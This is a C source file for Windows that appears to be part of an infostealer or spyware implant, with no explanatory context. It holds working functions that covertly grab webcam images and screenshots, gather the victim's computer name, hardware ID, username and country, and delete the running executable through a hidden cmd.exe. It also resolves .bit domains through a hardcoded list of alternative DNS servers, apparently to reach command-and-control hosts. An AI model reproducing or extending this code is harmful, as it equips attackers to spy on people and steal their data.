#include <windows.h>
#include <shlwapi.h>
#include <stdint.h>
#include <windns.h>
#include <atlbase.h>
#include <vfw.h>
#include "fncs.h"
#include "mem.h"
#define capSendMessage(hWnd, uMsg, wParm, lParam) ((IsWindow(hWnd)) ? SendMessageW(hWnd, uMsg, (WPARAM)(wParm), (LPARAM)(lParam)) : 0)

BOOL capWebCam(WCHAR* szFile, int nIndex, int nX, int nY, int nMsg)
{
	HWND hWndCap = capCreateCaptureWindowW(L"CapWebCam", WS_CHILD, 0, 0, nX, nY, GetDesktopWindow(), 0);
	if (!hWndCap) return FALSE;

	if (!capSendMessage(hWndCap, WM_CAP_DRIVER_CONNECT, nIndex, 0)) {
		DestroyWindow(hWndCap); return FALSE;
	}

	CAPDRIVERCAPS capDriverCaps;
	memset(&capDriverCaps, 0, sizeof(CAPDRIVERCAPS));
	capSendMessage(hWndCap, WM_CAP_DRIVER_GET_CAPS, sizeof(CAPDRIVERCAPS), &capDriverCaps);
	if (!capDriverCaps.fCaptureInitialized) {
		DestroyWindow(hWndCap); return FALSE;
	}

	capSendMessage(hWndCap, WM_CAP_SET_SCALE, TRUE, 0);
	capSendMessage(hWndCap, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
	capSendMessage(hWndCap, WM_CAP_FILE_SAVEDIBW, 0, szFile);
	capSendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
	DestroyWindow(hWndCap);

	return TRUE;
}

int GetCamIndex()
{
	char szDeviceName[80];
	char szDeviceVersion[80];

	for (int wIndex = 0; wIndex < 9; wIndex++)
	{
		if (capGetDriverDescriptionA(wIndex, szDeviceName, sizeof(szDeviceName),
			szDeviceVersion, sizeof(szDeviceVersion)))
			return wIndex;
	}
	return -1;
}

void captureCam(WCHAR* szPath) {
	int nIndex = GetCamIndex();
	if (nIndex == -1)
		return;

	capWebCam(szPath, nIndex, 640, 480, 10);
}

LPCSTR genCountry() {
	GEOID myGEO = GetUserGeoID(GEOCLASS_NATION);
	int sizeOfBuffer = GetGeoInfoA(myGEO, GEO_ISO2, NULL, 0, 0);

	CHAR* geo = (CHAR*)_alloc(sizeOfBuffer + 1);

	_set(geo, 0, sizeOfBuffer + 1);
	GetGeoInfoA(myGEO, GEO_ISO2, geo, sizeOfBuffer, 0);

	return geo;
}

void randomInt(SIZE_T* out, int from, int to) {
	HCRYPTPROV prov;
	BYTE pbData[2];

	if (CryptAcquireContextA(&prov, NULL, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		if (CryptGenRandom(prov, 2, pbData))
		{
			*out = (from + (((int)pbData[0] ^ (int)pbData[1]) % (to - from)));

			if (CryptReleaseContext(prov, 0))
				return;
		}
		else {
			_free(pbData);
			if (CryptReleaseContext(prov, 0))
				return;
		}
	}
	else {
		_free(pbData);
	}
}

void CryptGenKey(BYTE** data) {
	HCRYPTPROV prov;
	BYTE* pbData = (BYTE*)_alloc(256);

	if (CryptAcquireContextA(&prov, NULL, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		if (CryptGenRandom(prov, 256, pbData))
		{
			*data = pbData;

			if (CryptReleaseContext(prov, 0))
				return;
		}
		else {
			_free(pbData);
			if (CryptReleaseContext(prov, 0))
				return;
		}
	}
	else {
		_free(pbData);
	}
}

void selfDestruct()
{
	WCHAR* szModuleName = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
	WCHAR* szCmd = (WCHAR*)_alloc((MAX_PATH * 2) * sizeof(WCHAR));
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileNameW(NULL, szModuleName, MAX_PATH);
	wnsprintfW(szCmd, MAX_PATH, L"cmd.exe /C ping 1.1.1.1 -n 3 -w 3000 > Nul & Del /f /q \"%s\"", szModuleName);
	CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	_free(szModuleName);
	_free(szCmd);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	ExitProcess(0);
}

LPCWSTR getSystemInfoW() {
	HW_PROFILE_INFOW hw;
	SYSTEM_INFO si;
	GEOID myGEO = GetUserGeoID(GEOCLASS_NATION);
	int sizeOfBuffer = GetGeoInfoW(myGEO, GEO_ISO2, NULL, 0, 0);
	DWORD size = MAX_PATH;

	WCHAR* computername = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
	WCHAR* hwid = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
	WCHAR* username = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
	WCHAR* geo = (WCHAR*)_alloc((sizeOfBuffer + 1) * sizeof(WCHAR));

	memset(geo, 0, (sizeOfBuffer + 1) * sizeof(WCHAR));
	GetComputerNameW(computername, &size);
	GetCurrentHwProfileW(&hw);
	lstrcpyW(hwid, hw.szHwProfileGuid);
	GetEnvironmentVariableW(L"USERNAME", username, MAX_PATH);
	GetGeoInfoW(myGEO, GEO_ISO2, geo, sizeOfBuffer, 0);

	if (computername && hwid && username && geo) {
		WCHAR* info = (WCHAR*)_alloc(512 * sizeof(WCHAR));

		wnsprintfW(info, 512,
			L"System Information =>\r\n"
			L"\r\n"
			L"Computer Name: %s\r\n"
			L"\r\n"
			L"Hardware id: %s\r\n"
			L"\r\n"
			L"User name: %s\r\n"
			L"\r\n"
			L"Computer country: %s\r\n"
			L"\r\n",
			computername, hwid, username, geo
		);

		_free(computername);
		_free(hwid);
		_free(username);
		_free(geo);

		return info;
	}

	_free(computername);
	_free(hwid);
	_free(username);
	_free(geo);

	return 0;
}

CHAR* randKey() {
	const CHAR ALPH[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H' };
	int min = 0;
	int max = _countof(ALPH);
	int rand;
	CHAR* mem = (CHAR*)_alloc(5);

	rand = min + ((0xCC * GetTickCount()) % max);
	mem[0] = ALPH[rand];
	rand = min + ((0xAD * GetTickCount()) % max);
	mem[1] = ALPH[rand];
	rand = min + ((0xDD * GetTickCount()) % max);
	mem[2] = ALPH[rand];
	rand = min + ((0xEA * GetTickCount()) % max);
	mem[3] = ALPH[rand];
	mem[4] = 0;

	return mem;
}

BOOL pathExists(LPCWSTR path, BOOL isFile) {
	if (isFile) {
		DWORD dwAttrib = GetFileAttributesW(path);

		return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
			!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
	}
	else {
		DWORD attribs = ::GetFileAttributesW(path);
		if (attribs == INVALID_FILE_ATTRIBUTES) {
			return false;
		}
		return (attribs & FILE_ATTRIBUTE_DIRECTORY);
	}
}

LPCWSTR resolveEnvrimoment(const WCHAR* env) {
	WCHAR* mem = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR));
	GetEnvironmentVariableW(env, mem, 260);
	return mem;
}

int captureScreenshot(LPCWSTR szFile)
{
	HDC hdcScr, hdcMem;
	HBITMAP hbmScr;
	BITMAP bmp;
	int iXRes, iYRes;

	hdcScr = CreateDCA("DISPLAY", NULL, NULL, NULL);
	hdcMem = CreateCompatibleDC(hdcScr);
	iXRes = GetDeviceCaps(hdcScr, HORZRES);
	iYRes = GetDeviceCaps(hdcScr, VERTRES);
	hbmScr = CreateCompatibleBitmap(hdcScr, iXRes, iYRes);
	if (hbmScr == 0) return 0;
	if (!SelectObject(hdcMem, hbmScr)) return 0;
	if (!StretchBlt(hdcMem,
		0, 0, iXRes, iYRes,
		hdcScr,
		0, 0, iXRes, iYRes,
		SRCCOPY))

		return 0;

	PBITMAPINFO pbmi;
	WORD cClrBits;

	if (!GetObjectW(hbmScr, sizeof(BITMAP), (LPSTR)&bmp)) return 0;

	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
	if (cClrBits == 1)
		cClrBits = 1;
	else if (cClrBits <= 4)
		cClrBits = 4;
	else if (cClrBits <= 8)
		cClrBits = 8;
	else if (cClrBits <= 16)
		cClrBits = 16;
	else if (cClrBits <= 24)
		cClrBits = 24;
	else cClrBits = 32;
	if (cClrBits != 24)
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
			sizeof(BITMAPINFOHEADER) +
			sizeof(RGBQUAD) * (1 << cClrBits));

	else
		pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
			sizeof(BITMAPINFOHEADER));

	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	pbmi->bmiHeader.biWidth = bmp.bmWidth;
	pbmi->bmiHeader.biHeight = bmp.bmHeight;
	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
	if (cClrBits < 24)
		pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

	pbmi->bmiHeader.biCompression = BI_RGB;
	pbmi->bmiHeader.biSizeImage = (pbmi->bmiHeader.biWidth + 7) / 8
		* pbmi->bmiHeader.biHeight * cClrBits;
	pbmi->bmiHeader.biClrImportant = 0;

	HANDLE hf;
	BITMAPFILEHEADER hdr;
	PBITMAPINFOHEADER pbih;
	LPBYTE lpBits;
	DWORD dwTotal;
	DWORD cb;
	BYTE *hp;
	DWORD dwTmp;

	pbih = (PBITMAPINFOHEADER)pbmi;
	lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

	if (!lpBits) return 0;
	if (!GetDIBits(hdcMem, hbmScr, 0, (WORD)pbih->biHeight, lpBits, pbmi, DIB_RGB_COLORS)) return 0;
	hf = CreateFileW(szFile,
		GENERIC_READ | GENERIC_WRITE,
		(DWORD)0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL);
	if (hf == INVALID_HANDLE_VALUE) return 0;

	hdr.bfType = 0x4d42;

	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) +
		pbih->biSize + pbih->biClrUsed *
		sizeof(RGBQUAD) + pbih->biSizeImage);
	hdr.bfReserved1 = 0;
	hdr.bfReserved2 = 0;
	hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) +
		pbih->biSize + pbih->biClrUsed *
		sizeof(RGBQUAD);

	if (!WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER), (LPDWORD)&dwTmp, NULL)) return 0;

	if (!WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER)
		+ pbih->biClrUsed * sizeof(RGBQUAD),
		(LPDWORD)&dwTmp, NULL))
		return 0;

	dwTotal = cb = pbih->biSizeImage;
	hp = lpBits;
	if (!WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL)) return 0;

	if (!CloseHandle(hf)) return 0;

	GlobalFree((HGLOBAL)lpBits);
	ReleaseDC(0, hdcScr);
	ReleaseDC(0, hdcMem);

	return 1;
}

LPCWSTR bitGetHostByName(LPCWSTR domain) {
	if (StrStrW(domain, L".bit") == 0) return domain;

	DNS_STATUS dnsStatus;
	IN_ADDR ipaddr;
	PDNS_RECORD ppQueryResultsSet, p;
	PIP4_ARRAY pSrvList = NULL;

	LPCWSTR hostIP = (WCHAR*)_alloc(sizeof(WCHAR) * 35);
	_set((char*)hostIP, 0x00, sizeof(WCHAR) * 35);

	const char* dnsips[] = {
		"8.8.8.8", "91.217.137.37", "176.126.70.119", "193.183.98.66",
		"192.71.245.208", "217.144.135.2", "172.104.136.243",
		"68.183.70.217", "207.148.83.241", "104.238.186.189",
		"172.98.193.42", "162.248.241.94", "50.116.17.96",
		"66.70.228.164", "89.40.116.230", "45.71.185.100"
	};
	int num_dnsips = sizeof(dnsips) / sizeof(dnsips[0]);

	pSrvList = (PIP4_ARRAY)LocalAlloc(LPTR, sizeof(IP4_ARRAY));

	bool good_resolve = false;
	for (int i = 0; i < num_dnsips; i++)
	{
		pSrvList->AddrArray[0] = inet_addr(dnsips[i]);
		pSrvList->AddrCount = 1;

		dnsStatus = DnsQuery_W(domain,
			DNS_TYPE_A,
			DNS_QUERY_USE_TCP_ONLY,
			pSrvList,
			(PDNS_RECORD*)&ppQueryResultsSet,
			NULL);

		p = ppQueryResultsSet;

		while (p)
		{
			ipaddr.S_un.S_addr = (p->Data.A.IpAddress);

			USES_CONVERSION;
			WCHAR* wideVersion = A2W(inet_ntoa(ipaddr));

			wnsprintfW((WCHAR*)hostIP, 35, L"%s", wideVersion);
			if (!lstrcmpW(domain, p->pName)) {
				good_resolve = true;
				break;
			}
			p = p->pNext;
			good_resolve = true;
		}

		if (good_resolve)
			break;
	}

	if (pSrvList) LocalFree(pSrvList);
	DnsFree(ppQueryResultsSet, DnsFreeRecordList);

	return hostIP;
}